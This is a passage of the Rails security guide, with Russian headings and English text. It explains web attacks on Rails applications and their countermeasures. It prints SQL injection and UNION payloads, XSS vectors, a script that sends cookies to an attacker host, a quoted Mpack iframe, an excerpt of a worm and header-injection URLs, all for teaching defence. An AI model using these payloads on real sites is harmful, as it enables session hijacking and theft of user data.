Think of a situation where an attacker has stolen a user's session cookie and thus may co-use the application. If it is easy to change the password, the attacker will hijack the account with a few clicks. Or if the change-password form is vulnerable to CSRF, the attacker will be able to change the victim's password by luring him to a web page where there is a crafted IMG-tag which does the CSRF. As a countermeasure, _(highlight)make change-password forms safe against CSRF_, of course. And _(highlight)require the user to enter the old password when changing it_.

h5. E-Mail

However, the attacker may also take over the account by changing the e-mail address. After he changed it, he will go to the forgotten-password page and the (possibly new) password will be mailed to the attacker's e-mail address. As a countermeasure _(highlight)require the user to enter the password when changing the e-mail address, too_.

h5. Другое

Depending on your web application, there may be more ways to hijack the user's account. In many cases CSRF and XSS will help to do so. For example, as in a CSRF vulnerability in "Google Mail":http://www.gnucitizen.org/blog/google-gmail-e-mail-hijack-technique/. In this proof-of-concept attack, the victim would have been lured to a web site controlled by the attacker. On that site is a crafted IMG-tag which results in a HTTP GET request that changes the filter settings of Google Mail. If the victim was logged in to Google Mail, the attacker would change the filters to forward all e-mails to his e-mail address. This is nearly as harmful as hijacking the entire account. As a countermeasure, _(highlight)review your application logic and eliminate all XSS and CSRF vulnerabilities_.

h4. CAPTCHA

-- _A CAPTCHA is a challenge-response test to determine that the response is not generated by a computer. It is often used to protect comment forms from automatic spam bots by asking the user to type the letters of a distorted image. The idea of a negative CAPTCHA is not for a user to prove that he is human, but reveal that a robot is a robot._

But not only spam robots (bots) are a problem, but also automatic login bots. A popular CAPTCHA API is "reCAPTCHA":http://recaptcha.net/ which displays two distorted images of words from old books. It also adds an angled line, rather than a distorted background and high levels of warping on the text as earlier CAPTCHAs did, because the latter were broken. As a bonus, using reCAPTCHA helps to digitize old books. "ReCAPTCHA":http://ambethia.com/recaptcha/ is also a Rails plug-in with the same name as the API.

You will get two keys from the API, a public and a private key, which you have to put into your Rails environment. After that you can use the recaptcha_tags method in the view, and the verify_recaptcha method in the controller. Verify_recaptcha will return false if the validation fails.
The problem with CAPTCHAs is, they are annoying. Additionally, some visually impaired users have found certain kinds of distorted CAPTCHAs difficult to read. The idea of negative CAPTCHAs is not to ask a user to proof that he is human, but reveal that a spam robot is a bot.

Most bots are really dumb, they crawl the web and put their spam into every form's field they can find. Negative CAPTCHAs take advantage of that and include a "honeypot" field in the form which will be hidden from the human user by CSS or JavaScript.

Here are some ideas how to hide honeypot fields by JavaScript and/or CSS:

* position the fields off of the visible area of the page
* make the elements very small or colour them the same as the background of the page
* leave the fields displayed, but tell humans to leave them blank

The most simple negative CAPTCHA is one hidden honeypot field. On the server side, you will check the value of the field: If it contains any text, it must be a bot. Then, you can either ignore the post or return a positive result, but not saving the post to the database. This way the bot will be satisfied and moves on. You can do this with annoying users, too.

You can find more sophisticated negative CAPTCHAs in Ned Batchelder's "blog post":http://nedbatchelder.com/text/stopbots.html:

* Include a field with the current UTC time-stamp in it and check it on the server. If it is too far in the past, or if it is in the future, the form is invalid.
* Randomize the field names
* Include more than one honeypot field of all types, including submission buttons

Note that this protects you only from automatic bots, targeted tailor-made bots cannot be stopped by this. So _(highlight)negative CAPTCHAs might not be good to protect login forms_.

h4. Журналирование

-- _Tell Rails not to put passwords in the log files._

By default, Rails logs all requests being made to the web application. But log files can be a huge security issue, as they may contain login credentials, credit card numbers et cetera. When designing a web application security concept, you should also think about what will happen if an attacker got (full) access to the web server. Encrypting secrets and passwords in the database will be quite useless, if the log files list them in clear text. You can _(highlight)filter certain request parameters from your log files_ by the filter_parameter_logging method in a controller. These parameters will be marked [FILTERED] in the log.

<ruby>
filter_parameter_logging :password
</ruby>

h4. Годные пароли Good Passwords

-- _Do you find it hard to remember all your passwords? Don't write them down, but use the initial letters of each word in an easy to remember sentence._

Bruce Schneier, a security technologist, "has analysed":http://www.schneier.com/blog/archives/2006/12/realworld_passw.html 34,000 real-world user names and passwords from the MySpace phishing attack mentioned earlier. It turns out that most of the passwords are quite easy to crack. The 20 most common passwords are:

password1, abc123, myspace1, password, blink182, qwerty1, ****you, 123abc, baseball1, football1, 123456, soccer, monkey1, liverpool1, princess1, jordan23, slipknot1, superman1, iloveyou1, and monkey.

It is interesting that only 4% of these passwords were dictionary words and the great majority is actually alphanumeric. However, password cracker dictionaries contain a large number of today's passwords, and they try out all kinds of (alphanumerical) combinations. If an attacker knows your user name and you use a weak password, your account will be easily cracked.

A good password is a long alphanumeric combination of mixed cases. As this is quite hard to remember, it is advisable to enter only the _(highlight)first letters of a sentence that you can easily remember_. For example "The quick brown fox jumps over the lazy dog" will be "Tqbfjotld". Note that this is just an example, you should not use well known phrases like these, as they might appear in cracker dictionaries, too.

h4. Регулярные выражения

-- _A common pitfall in Ruby's regular expressions is to match the string's beginning and end by ^ and $, instead of \A and \z._

Ruby uses a slightly different approach than many other languages to match the end and the beginning of a string. That is why even many Ruby and Rails books make this wrong. So how is this a security threat? Imagine you have a File model and you validate the file name by a regular expression like this:

<ruby>
class File < ActiveRecord::Base
  validates_format_of :name, :with => /^[\w\.\-\+]+$/
end
</ruby>

This means, upon saving, the model will validate the file name to consist only of alphanumeric characters, dots, + and -. And the programmer added \^ and $ so that file name will contain these characters from the beginning to the end of the string. However, _(highlight)in Ruby ^ and $ matches the *line* beginning and line end_. And thus a file name like this passes the filter without problems:

<plain>
file.txt%0A<script>alert('hello')</script>
</plain>

Whereas %0A is a line feed in URL encoding, so Rails automatically converts it to "file.txt\n&lt;script&gt;alert('hello')&lt;/script&gt;". This file name passes the filter because the regular expression matches – up to the line end, the rest does not matter. The correct expression should read:

<ruby>
/\A[\w\.\-\+]+\z/
</ruby>

h4. Расширение привелегий

-- _Changing a single parameter may give the user unauthorized access. Remember that every parameter may be changed, no matter how much you hide or obfuscate it._

The most common parameter that a user might tamper with, is the id parameter, as in +":id":http://www.domain.com/project/1+, whereas 1 is the id. It will be available in params in the controller. There, you will most likely do something like this:

<ruby>
@project = Project.find(params[:id])
</ruby>

This is alright for some web applications, but certainly not if the user is not authorized to view all projects. If the user changes the id to 42, and he is not allowed to see that information, he will have access to it anyway. Instead, _(highlight)query the user's access rights, too_:

<ruby>
@project = @current_user.projects.find(params[:id])
</ruby>

Depending on your web application, there will be many more parameters the user can tamper with. As a rule of thumb, _(highlight)no user input data is secure, until proven otherwise, and every parameter from the user is potentially manipulated_.

Don‘t be fooled by security by obfuscation and JavaScript security. The Web Developer Toolbar for Mozilla Firefox lets you review and change every form's hidden fields. _(highlight)JavaScript can be used to validate user input data, but certainly not to prevent attackers from sending malicious requests with unexpected values_. The Live Http Headers plugin for Mozilla Firefox logs every request and may repeat and change them. That is an easy way to bypass any JavaScript validations. And there are even client-side proxies that allow you to intercept any request and response from and to the Internet.

h3. Инъекция

-- _Injection is a class of attacks that introduce malicious code or parameters into a web application in order to run it within its security context. Prominent examples of injection are cross-site scripting (XSS) and SQL injection._

Injection is very tricky, because the same code or parameter can be malicious in one context, but totally harmless in another. A context can be a scripting, query or programming language, the shell or a Ruby/Rails method. The following sections will cover all important contexts where injection attacks may happen. The first section, however, covers an architectural decision in connection with Injection.

h4. "Белый список" VS "Черный список"

-- _When sanitizing, protecting or verifying something, whitelists over blacklists._

A blacklist can be a list of bad e-mail addresses, non-public actions or bad HTML tags. This is opposed to a whitelist which lists the good e-mail addresses, public actions, good HTML tags and so on. Although, sometimes it is not possible to create a whitelist (in a SPAM filter, for example), _(highlight)prefer to use whitelist approaches_:

* Use before_filter :only => [...] instead of :except => [...]. This way you don't forget to turn it off for newly added actions.
* Use attr_accessible instead of attr_protected. See the mass-assignment section for details
* Allow &lt;strong&gt; instead of removing &lt;script&gt; against Cross-Site Scripting (XSS). See below for details.
* Don't try to correct user input by blacklists:
** This will make the attack work: "&lt;sc&lt;script&gt;ript&gt;".gsub("&lt;script&gt;", "")
** But reject malformed input

Whitelists are also a good approach against the human factor of forgetting something in the blacklist.

h4. SQL инъекция

-- _Thanks to clever methods, this is hardly a problem in most Rails applications. However, this is a very devastating and common attack in web applications, so it is important to understand the problem._

h5. Введение

SQL injection attacks aim at influencing database queries by manipulating web application parameters. A popular goal of SQL injection attacks is to bypass authorization. Another goal is to carry out data manipulation or reading arbitrary data. Here is an example of how not to use user input data in a query:

<ruby>
Project.find(:all, :conditions => "name = '#{params[:name]}'")
</ruby>

This could be in a search action and the user may enter a project's name that he wants to find. If a malicious user enters ' OR 1=1', the resulting SQL query will be:

<sql>
SELECT * FROM projects WHERE name = '' OR 1 --'
</sql>

The two dashes start a comment ignoring everything after it. So the query returns all records from the projects table including those blind to the user. This is because the condition is true for all records.

h5. Обход авторизации

Usually a web application includes access control. The user enters his login credentials, the web applications tries to find the matching record in the users table. The application grants access when it finds a record. However, an attacker may possibly bypass this check with SQL injection. The following shows a typical database query in Rails to find the first record in the users table which matches the login credentials parameters supplied by the user.

<ruby>
User.find(:first, "login = '#{params[:name]}' AND password = '#{params[:password]}'")
</ruby>

If an attacker enters ' OR '1'='1 as the name, and ' OR '2'>'1 as the password, the resulting SQL query will be:

<sql>
SELECT * FROM users WHERE login = '' OR '1'='1' AND password = '' OR '2'&gt;'1' LIMIT 1
</sql>

This will simply find the first record in the database, and grants access to this user.

h5. Неавторизованный просмотр

The UNION statement connects two SQL queries and returns the data in one set. An attacker can use it to read arbitrary data from the database. Let's take the example from above:

<ruby>
Project.find(:all, :conditions => "name = '#{params[:name]}'")
</ruby>

And now let's inject another query using the UNION statement:

<plain>
') UNION SELECT id,login AS name,password AS description,1,1,1 FROM users --
</plain>

This will result in the following SQL query:

<sql>
SELECT * FROM projects WHERE (name = '') UNION
  SELECT id,login AS name,password AS description,1,1,1 FROM users --')
</sql>

The result won't be a list of projects (because there is no project with an empty name), but a list of user names and their password. So hopefully you encrypted the passwords in the database! The only problem for the attacker is, that the number of columns has to be the same in both queries. That's why the second query includes a list of ones (1), which will be always the value 1, in order to match the number of columns in the first query.

Also, the second query renames some columns with the AS statement so that the web application displays the values from the user table. Be sure to update your Rails "to at least 2.1.1":http://www.rorsecurity.info/2008/09/08/sql-injection-issue-in-limit-and-offset-parameter/.

h5. Контрмеры

Ruby on Rails has a built in filter for special SQL characters, which will escape ' , " , NULL character and line breaks. <em class="highlight">Using +Model.find(id)+ or +Model.find_by_some thing(something)+ automatically applies this countermeasure</em>. But in SQL fragments, especially <em class="highlight">in conditions fragments (+:conditions => "..."+), the +connection.execute()+ or +Model.find_by_sql()+ methods, it has to be applied manually</em>.

Instead of passing a string to the conditions option, you can pass an array to sanitize tainted strings like this:

<ruby>
Model.find(:first, :conditions => ["login = ? AND password = ?", entered_user_name, entered_password])
</ruby>

As you can see, the first part of the array is an SQL fragment with question marks. The sanitized versions of the variables in the second part of the array replace the question marks. Or you can pass a hash for the same result:

<ruby>
Model.find(:first, :conditions => {:login => entered_user_name, :password => entered_password})
</ruby>

The array or hash form is only available in model instances. You can try +sanitize_sql()+ elsewhere. _(highlight)Make it a habit to think about the security consequences when using an external string in SQL_.

h4. Межсайтовый скриптинг (XSS, Cross-Site Scripting)

-- _The most widespread, and one of the most devastating security vulnerabilities in web applications is XSS. This malicious attack injects client-side executable code. Rails provides helper methods to fend these attacks off._

h5. Точки входа

An entry point is a vulnerable URL and its parameters where an attacker can start an attack.

The most common entry points are message posts, user comments, and guest books, but project titles, document names and search result pages have also been vulnerable - just about everywhere where the user can input data. But the input does not necessarily have to come from input boxes on web sites, it can be in any URL parameter – obvious, hidden or internal. Remember that the user may intercept any traffic. Applications, such as the "Live HTTP Headers Firefox plugin":http://livehttpheaders.mozdev.org/, or client-site proxies make it easy to change requests.

XSS attacks work like this: An attacker injects some code, the web application saves it and displays it on a page, later presented to a victim. Most XSS examples simply display an alert box, but it is more powerful than that. XSS can steal the cookie, hijack the session, redirect the victim to a fake website, display advertisements for the benefit of the attacker, change elements on the web site to get confidential information or install malicious software through security holes in the web browser.

During the second half of 2007, there were 88 vulnerabilities reported in Mozilla browsers, 22 in Safari, 18 in IE, and 12 in Opera. The "Symantec Global Internet Security threat report":http://eval.symantec.com/mktginfo/enterprise/white_papers/b-whitepaper_internet_security_threat_report_xiii_04-2008.en-us.pdf also documented 239 browser plug-in vulnerabilities in the last six months of 2007. "Mpack":http://pandalabs.pandasecurity.com/archive/MPack-uncovered_2100_.aspx is a very active and up-to-date attack framework which exploits these vulnerabilities. For criminal hackers, it is very attractive to exploit an SQL-Injection vulnerability in a web application framework and insert malicious code in every textual table column. In April 2008 more than 510,000 sites were hacked like this, among them the British government, United Nations, and many more high targets.

A relatively new, and unusual, form of entry points are banner advertisements. In earlier 2008, malicious code appeared in banner ads on popular sites, such as MySpace and Excite, according to "Trend Micro":http://blog.trendmicro.com/myspace-excite-and-blick-serve-up-malicious-banner-ads/.

h5. HTML/JavaScript инъекции

The most common XSS language is of course the most popular client-side scripting language JavaScript, often in combination with HTML. _(highlight)Escaping user input is essential_.

Here is the most straightforward test to check for XSS:

<html>
<script>alert('Hello');</script>
</html>

This JavaScript code will simply display an alert box. The next examples do exactly the same, only in very uncommon places:

<html>
<img src=javascript:alert('Hello')>
<table background="javascript:alert('Hello')">
</html>

h6. Кража Cookie

These examples don't do any harm so far, so let's see how an attacker can steal the user's cookie (and thus hijack the user's session). In JavaScript you can use the document.cookie property to read and write the document's cookie. JavaScript enforces the same origin policy, that means a script from one domain cannot access cookies of another domain. The document.cookie property holds the cookie of the originating web server. However, you can read and write this property, if you embed the code directly in the HTML document (as it happens with XSS). Inject this anywhere in your web application to see your own cookie on the result page:

<plain>
<script>document.write(document.cookie);</script>
</plain>

For an attacker, of course, this is not useful, as the victim will see his own cookie. The next example will try to load an image from the URL http://www.attacker.com/ plus the cookie. Of course this URL does not exist, so the browser displays nothing. But the attacker can review his web server's access log files to see the victims cookie.

<html>
<script>document.write('<img src="http://www.attacker.com/' + document.cookie + '">');</script>
</html>

The log files on www.attacker.com will read like this:

<plain>
GET http://www.attacker.com/_app_session=836c1c25278e5b321d6bea4f19cb57e2
</plain>

You can mitigate these attacks (in the obvious way) by adding the "httpOnly":http://dev.rubyonrails.org/ticket/8895 flag to cookies, so that document.cookie may not be read by JavaScript. Http only cookies can be used from IE v6.SP1, Firefox v2.0.0.5 and Opera 9.5. Safari is still considering, it ignores the option. But other, older browsers (such as WebTV and IE 5.5 on Mac) can actually cause the page to fail to load. Be warned that cookies "will still be visible using Ajax":http://ha.ckers.org/blog/20070719/firefox-implements-httponly-and-is-vulnerable-to-xmlhttprequest/, though.

h6. Дефейс

With web page defacement an attacker can do a lot of things, for example, present false information or lure the victim on the attackers web site to steal the cookie, login credentials or other sensitive data. The most popular way is to include code from external sources by iframes:

<html>
<iframe name=”StatPage” src="http://58.xx.xxx.xxx" width=5 height=5 style=”display:none”></iframe>
</html>

This loads arbitrary HTML and/or JavaScript from an external source and embeds it as part of the site. This iframe is taken from an actual attack on legitimate Italian sites using the "Mpack attack framework":http://isc.sans.org/diary.html?storyid=3015. Mpack tries to install malicious software through security holes in the web browser – very successfully, 50% of the attacks succeed.

A more specialized attack could overlap the entire web site or display a login form, which looks the same as the site's original, but transmits the user name and password to the attackers site. Or it could use CSS and/or JavaScript to hide a legitimate link in the web application, and display another one at its place which redirects to a fake web site.

Reflected injection attacks are those where the payload is not stored to present it to the victim later on, but included in the URL. Especially search forms fail to escape the search string. The following link presented a page which stated that "George Bush appointed a 9 year old boy to be the chairperson...":

<plain>
http://www.cbsnews.com/stories/2002/02/15/weather_local/main501644.shtml?zipcode=1-->
  <script src=http://www.securitylab.ru/test/sc.js></script><!--
</plain>

h6. Контрмеры

_(highlight)It is very important to filter malicious input, but it is also important to escape the output of the web application_.

Especially for XSS, it is important to do _(highlight)whitelist input filtering instead of blacklist_. Whitelist filtering states the values allowed as opposed to the values not allowed. Blacklists are never complete.

Imagine a blacklist deletes “script” from the user input. Now the attacker injects “&lt;scrscriptipt&gt;”, and after the filter, “&lt;script&gt;” remains. Earlier versions of Rails used a blacklist approach for the strip_tags(), strip_links() and sanitize() method. So this kind of injection was possible:

<ruby>
strip_tags("some<<b>script>alert('hello')<</b>/script>")
</ruby>

This returned "some&lt;script&gt;alert('hello')&lt;/script&gt;", which makes an attack work. That's why I vote for a whitelist approach, using the updated Rails 2 method sanitize():

<ruby>
tags = %w(a acronym b strong i em li ul ol h1 h2 h3 h4 h5 h6 blockquote br cite sub sup ins p)
s = sanitize(user_input, :tags => tags, :attributes => %w(href title))
</ruby>

This allows only the given tags and does a good job, even against all kinds of tricks and malformed tags.

As a second step, _(highlight)it is good practice to escape all output of the application_, especially when re-displaying user input, which hasn't been input-filtered (as in the search form example earlier on). _(highlight)Use +escapeHTML()+ (or its alias +h()+) method_ to replace the HTML input characters &amp;, &quot;, &lt;, &gt; by their uninterpreted representations in HTML (+&amp;amp;+, +&amp;quot;+, +&amp;lt+;, and +&amp;gt;+). However, it can easily happen that the programmer forgets to use it, so <em class="highlight">it is recommended to use the "SafeErb":http://safe-erb.rubyforge.org/svn/plugins/safe_erb/ plugin</em>. SafeErb reminds you to escape strings from external sources.

h6. Обфускация и инъекции кодировки

Network traffic is mostly based on the limited Western alphabet, so new character encodings, such as Unicode, emerged, to transmit characters in other languages. But, this is also a threat to web applications, as malicious code can be hidden in different encodings that the web browser might be able to process, but the web application might not. Here is an attack vector in UTF-8 encoding:

<html>
<IMG SRC=&amp;#106;&amp;#97;&amp;#118;&amp;#97;&amp;#115;&amp;#99;&amp;#114;&amp;#105;&amp;#112;&amp;#116;&amp;#58;&amp;#97;
  &amp;#108;&amp;#101;&amp;#114;&amp;#116;&amp;#40;&amp;#39;&amp;#88;&amp;#83;&amp;#83;&amp;#39;&amp;#41;>
</html>

This example pops up a message box. It will be recognized by the above sanitize() filter, though. A great tool to obfuscate and encode strings, and thus “get to know your enemy”, is the "Hackvertor":http://www.businessinfo.co.uk/labs/hackvertor/hackvertor.php. Rails‘ sanitize() method does a good job to fend off encoding attacks.

h5. Examples from the Underground

_In order to understand today's attacks on web applications, it's best to take a look at some real-world attack vectors._

The following is an excerpt from the "Js.Yamanner@m":http://www.symantec.com/security_response/writeup.jsp?docid=2006-061211-4111-99&tabid=1 Yahoo! Mail "worm":http://groovin.net/stuff/yammer.txt. It appeared on June 11, 2006 and was the first webmail interface worm:

<html>
<img src='http://us.i1.yimg.com/us.yimg.com/i/us/nt/ma/ma_mail_1.gif'
  target=""onload="var http_request = false;    var Email = '';
  var IDList = '';   var CRumb = '';   function makeRequest(url, Func, Method,Param) { ...
</html>

The worms exploits a hole in Yahoo's HTML/JavaScript filter, which usually filters all target and onload attributes from tags (because there can be JavaScript). The filter is applied only once, however, so the onload attribute with the worm code stays in place. This is a good example why blacklist filters are never complete and why it is hard to allow HTML/JavaScript in a web application.

Another proof-of-concept webmail worm is Nduja, a cross-domain worm for four Italian webmail services. Find more details on "Rosario Valotta's paper":http://www.xssed.com/article/9/Paper_A_PoC_of_a_cross_webmail_worm_XWW_called_Njuda_connection/. Both webmail worms have the goal to harvest email addresses, something a criminal hacker could make money with.

In December 2006, 34,000 actual user names and passwords were stolen in a "MySpace phishing attack":http://news.netcraft.com/archives/2006/10/27/myspace_accounts_compromised_by_phishers.html. The idea of the attack was to create a profile page named “login_home_index_html”, so the URL looked very convincing. Specially-crafted HTML and CSS was used to hide the genuine MySpace content from the page and instead display its own login form.

The MySpace Samy worm will be discussed in the CSS Injection section.

h4. CSS инъекции

-- _CSS Injection is actually JavaScript injection, because some browsers (IE, some versions of Safari and others) allow JavaScript in CSS. Think twice about allowing custom CSS in your web application._

CSS Injection is explained best by a well-known worm, the "MySpace Samy worm":http://namb.la/popular/tech.html. This worm automatically sent a friend request to Samy (the attacker) simply by visiting his profile. Within several hours he had over 1 million friend requests, but it creates too much traffic on MySpace, so that the site goes offline. The following is a technical explanation of the worm.

MySpace blocks many tags, however it allows CSS. So the worm's author put JavaScript into CSS like this:

<html>
<div style="background:url('javascript:alert(1)')">
</html>

So the payload is in the style attribute. But there are no quotes allowed in the payload, because single and double quotes have already been used. But JavaScript allows has a handy eval() function which executes any string as code.

<html>
<div id="mycode" expr="alert('hah!')" style="background:url('javascript:eval(document.all.mycode.expr)')">
</html>

The eval() function is a nightmare for blacklist input filters, as it allows the style attribute to hide the word “innerHTML”:

<plain>
alert(eval('document.body.inne' + 'rHTML'));
</plain>

The next problem was MySpace filtering the word “javascript”, so the author used “java&lt;NEWLINE&gt;script" to get around this:

<html>
<div id="mycode" expr="alert('hah!')" style="background:url('java↵ script:eval(document.all.mycode.expr)')">
</html>

Another problem for the worm's author were CSRF security tokens. Without them he couldn't send a friend request over POST. He got around it by sending a GET to the page right before adding a user and parsing the result for the CSRF token.

In the end, he got a 4 KB worm, which he injected into his profile page.

The "moz-binding":http://www.securiteam.com/securitynews/5LP051FHPE.html CSS property proved to be another way to introduce JavaScript in CSS in Gecko-based browsers (Firefox, for example).

h5. Контрмеры

This example, again, showed that a blacklist filter is never complete. However, as custom CSS in web applications is a quite rare feature, I am not aware of a whitelist CSS filter. _(highlight)If you want to allow custom colours or images, you can allow the user to choose them and build the CSS in the web application_. Use Rails' +sanitize()+ method as a model for a whitelist CSS filter, if you really need one.

h4. Textile инъекции

-- _If you want to provide text formatting other than HTML (due to security), use a mark-up language which is converted to HTML on the server-side. "RedCloth":http://redcloth.org/ is such a language for Ruby, but without precautions, it is also vulnerable to XSS._

For example, RedCloth translates +_test_+ to &lt;em&gt;test&lt;em&gt;, which makes the text italic. However, up to the current version 3.0.4, it is still vulnerable to XSS. Get the "all-new version 4":http://www.redcloth.org that removed serious bugs. However, even that version has "some security bugs":http://www.rorsecurity.info/journal/2008/10/13/new-redcloth-security.html, so the countermeasures still apply. Here is an example for version 3.0.4:

<ruby>
RedCloth.new('<script>alert(1)</script>').to_html
# => "<script>alert(1)</script>"
</ruby>

Use the :filter_html option to remove HTML which was not created by the Textile processor.

<ruby>
RedCloth.new('<script>alert(1)</script>', [:filter_html]).to_html
# => "alert(1)"
</ruby>

However, this does not filter all HTML, a few tags will be left (by design), for example &lt;a&gt;:

<ruby>
RedCloth.new("<a href='javascript:alert(1)'>hello</a>", [:filter_html]).to_html
# => "<p><a href="javascript:alert(1)">hello</a></p>"
</ruby>

h5. Контрмеры

It is recommended to _(highlight)use RedCloth in combination with a whitelist input filter_, as described in the countermeasures against XSS section.

h4. Ajax инъекции

-- _The same security precautions have to be taken for Ajax actions as for “normal” ones. There is at least one exception, however: The output has to be escaped in the controller already, if the action doesn't render a view._

If you use the "in_place_editor plugin":http://dev.rubyonrails.org/browser/plugins/in_place_editing, or actions that return a string, rather than rendering a view, _(highlight)you have to escape the return value in the action_. Otherwise, if the return value contains a XSS string, the malicious code will be executed upon return to the browser. Escape any input value using the h() method.

h4. RJS инъекции

-- _Don't forget to escape in JavaScript (RJS) templates, too._

The RJS API generates blocks of JavaScript code based on Ruby code, thus allowing you to manipulate a view or parts of a view from the server side. <em class="highlight">If you allow user input in RJS templates, do escape it using +escape_javascript()+ within JavaScript functions, and in HTML parts using +h()+</em>. Otherwise an attacker could execute arbitrary JavaScript.

h4. Инъекции командной строки

-- _Use user-supplied command line parameters with caution._

If your application has to execute commands in the underlying operating system, there are several methods in Ruby: exec(command), syscall(command), system(command) and \+command+. You will have to be especially careful with these functions if the user may enter the whole command, or a part of it. This is because in most shells, you can execute another command at the end of the first one, concatenating them with a semicolon (;) or a vertical bar (|).

A countermeasure is to _(highlight)use the +system(command, parameters)+ method which passes command line parameters safely_.

<ruby>
system("/bin/echo","hello; rm *")
# prints "hello; rm *" and does not delete files
</ruby>


h4. Инъекции HTTP-заголовков

-- _HTTP headers are dynamically generated and under certain circumstances user input may be injected. This can lead to false redirection, XSS or HTTP response splitting._

HTTP request headers have a Referer, User-Agent (client software), and Cookie field, among others. Response headers for example have a status code, Cookie and Location (redirection target URL) field. All of them are user-supplied and may be manipulated with more or less effort. _(highlight)Remember to escape these header fields, too._ For example when you display the user agent in an administration area.

Besides that, it is _(highlight)important to know what you are doing when building response headers partly based on user input._ For example you want to redirect the user back to a specific page. To do that you introduced a “referer“ field in a form to redirect to the given address:

<ruby>
redirect_to params[:referer]
</ruby>

What happens is that Rails puts the string into the Location header field and sends a 302 (redirect) status to the browser. The first thing a malicious user would do, is this:

<plain>
http://www.yourapplication.com/controller/action?referer=http://www.malicious.tld
</plain>

And due to a bug in (Ruby and) Rails up to version 2.1.2 (excluding it), a hacker may inject arbitrary header fields; for example like this:

<plain>
http://www.yourapplication.com/controller/action?referer=http://www.malicious.tld%0d%0aX-Header:+Hi!
http://www.yourapplication.com/controller/action?referer=path/at/your/app%0d%0aLocation:+http://www.malicious.tld
</plain>

Note that "%0d%0a" is URL-encoded for "\r\n" which is a carriage-return and line-feed (CRLF) in Ruby. So the resulting HTTP header for the second example will be the following because the second Location header field overwrites the first.

<plain>
HTTP/1.1 302 Moved Temporarily
(...)
Location: http://www.malicious.tld
</plain>

So _(highlight)attack vectors for Header Injection are based on the injection of CRLF characters in a header field._ And what could an attacker do with a false redirection? He could redirect to a phishing site that looks the same as yours, but asks to login again (and sends the login credentials to the attacker). Or he could install malicious software through browser security holes on that site. Rails 2.1.2 escapes these characters for the Location field in the +redirect_to+ method. _(highlight)Make sure you do it yourself when you build other header fields with user input._

h5. Дробление ответа сервера

If Header Injection was possible, Response Splitting might be, too. In HTTP, the header block is followed by two CRLFs and the actual data (usually HTML). The idea of Response Splitting is to inject two CRLFs into a header field, followed by another response with malicious HTML. The response will be:

<plain>
HTTP/1.1 302 Found [First standard 302 response]
Date: Tue, 12 Apr 2005 22:09:07 GMT
Location: Content-Type: text/html


HTTP/1.1 200 OK [Second New response created by attacker begins]
Content-Type: text/html


&lt;html&gt;&lt;font color=red&gt;hey&lt;/font&gt;&lt;/html&gt; [Arbitary malicious input is
Keep-Alive: timeout=15, max=100         shown as the redirected page]
Connection: Keep-Alive
Transfer-Encoding: chunked
Content-Type: text/html
</plain>

Under certain circumstances this would present the malicious HTML to the victim. However, this only seems to work with Keep-Alive connections (and many browsers are using one-time connections). But you can't rely on this. _(highlight)In any case this is a serious bug, and you should update your Rails to version 2.0.5 or 2.1.2 to eliminate Header Injection (and thus response splitting) risks._


h3. Additional Resources

The security landscape shifts and it is important to keep up to date, because missing a new vulnerability can be catastrophic. You can find additional resources about (Rails) security here:

* The Ruby on Rails security project posts security news regularly: "http://www.rorsecurity.info":http://www.rorsecurity.info
* Subscribe to the Rails security "mailing list":http://groups.google.com/group/rubyonrails-security
* "Keep up to date on the other application layers":http://secunia.com/ (they have a weekly newsletter, too)
* A "good security blog":http://ha.ckers.org/blog/ including the "Cross-Site scripting Cheat Sheet":http://ha.ckers.org/xss.html

h3. Changelog

"Lighthouse ticket":http://rails.lighthouseapp.com/projects/16213-rails-guides/tickets/7

* November 1, 2008: First approved version by Heiko Webers
